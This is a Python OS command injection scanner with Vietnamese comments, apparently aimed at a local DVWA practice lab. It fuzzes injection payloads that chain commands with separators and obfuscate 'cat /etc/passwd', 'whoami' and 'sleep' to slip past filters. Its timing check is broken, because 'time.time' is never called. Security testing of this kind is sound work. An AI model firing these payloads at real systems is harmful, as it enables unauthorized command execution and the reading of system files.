'''
OS command injection tool
thực hiện detect vul này dựa trên 2 kỹ thuật: 
    + result-base
    + time-base
đối với result base thì chúng ta chỉ cần thực hiện gửi những đầu ra sẽ hiển thị lỗi ví dụ: echo "xyz", python -c ....
đối với time-base ta sẽ thực hiện truyền các câu lệnh sleep(x), delay(x), ...  Tính thời gian phản hồi của response để detect
2 Hệ điều hành: windows và linux
 Tổng cộng có 4 cái schema
Payload được tham khảo từ Payload all the thíngs
'''
from connect import connect
from a import simple_grammar_fuzzer

detect_etc_passwd = {"root:x:x", "www-data:x:33:33", "/root:/bin/bash", "nologin"}
detect_echo = {"This is fking test arg"}
detect_whoami = {"www-data"}
class cmd():

    '''
    def __init__(self):
        self.detect_etc_passwd = {"root:x:x", "www-data:x:33:33", "/root:/bin/bash", "nologin"}
        self.detect_echo = {"This is fking test arg"}
        self.detect_whoami = {"www-data"}
    '''

    def generator(self, GRAMMAR):
            return set([simple_grammar_fuzzer(GRAMMAR, "<", ">", '<start>') for i in range(10)])

    def result_base_generator(self):
        result_based = {
            "<start>" : ["<quote><command>"],
            "<quote>" : ["|",";" ,"&&" , "&", "%0a"],
            "<command>" : ["<echo><spaceEcho><echoArgument>", "<cat><spaceCat><catArgument>"],
            "<echo>" : ["echo", "e\'c\'h\'o", "e\"c\"h\"o", "ech$@o"],
            "<cat>" : ["cat", "c\'a\'t", "c\"a\"t", "ca$@t"],
            "<spaceEcho>" : [" ", "  -e ", "%20"],
            "<spaceCat>" : ["<", "$IFS", " ", "%20"],
            "<echoArgument>" : ["This is fking test arg"],
            "<catArgument>" : [
                                "/etc/passwd", "\"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\"" , 
                                "${HOME:0:1}etc${HOME:0:1}passwd", "$(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd"
                            ]
        }
        return self.generator(result_based)

    def time_base_generator(self):
        time_based = {
            "<start>" : ["<quote><command>"],
            "<quote>" : ["|", ";"],
            "<command>" : ["timeout<space><time>", "delay<space><time>", "sleep<space><time>", "dir"],
            "<space>" : [" ", "%20"],
            "<time>" : ["5"]
        }
        return self.generator(time_based)

    def another_command(self):
        another = {
            "<start>" : ["<quote><command>"],
            "<command>" : ["dir", "ls", "id", "i'd'", "i\"d\"" "w'h'o'a'm'i'", "w\"h\"o\"a\"m\"i\"" "'u'n'a'm'e' -a", "\"u\"n\"a\"m\"e\" -a"],
            "<quote>" : ["|", ";", "&&", "&"]
        }
        return self.generator(another)

    
    def scan(self,url, method, params, cookies):
        import random
        import time
        j = 0
        
        payloads = self.time_base_generator()
        payloads.update(self.another_command())
        payloads.update(self.result_base_generator())
        payloadList = list(payloads)
        for payload in payloads:
            if j == 5:
                break
            x = random.randrange(0, len(payloads))
            check = self.scanner_oscmd(url, method, params, cookies, payloadList[x])
            j = j + 1
            if check == 1:
                return 0
        time.sleep(2)

        

    def scanner_oscmd(self, url, method, params, cookies, payload):
        import time
        status_code = 500
        r = None
        content = None
        status_code = 200
        conn = connect()

        start = time.time 

        # Cần phải truyền thêm parameter vào để phục vụ cho chức năng post
        if method == "GET" or method == "get":
            url = url+ payload # nối chuỗi nào! 
            r = conn.gett(url, params, payload, cookies)
        if method == "POST" or method== "post": 
            r = conn.postt(url, params, payload, cookies)

        content = str(r.content)

        check = 0
        for i in detect_etc_passwd:
            if i in content:
                check = 1
        if check == 1:
            print("OS command injection: " + url)
            return 1
        

        for i in detect_echo:
            if (i in content) and (payload in content):
                return 0
            if i in content:
                print("OS command injection: " + url)
                return 1
        

        end = time.time
        if end == 5:
            print ("time-base command injection")
            return 1
        return 0
from crawler import crawler

a = cmd()
cookie = {"PHPSESSID" : "f2c280e624310d43cafd4cebf90a1768", "security": "low"}
crawl = crawler("http://localhost/dvwa/", [] ,cookie)
listedCrawl = crawl.run_crawler()

for i in listedCrawl:
    print(i)




            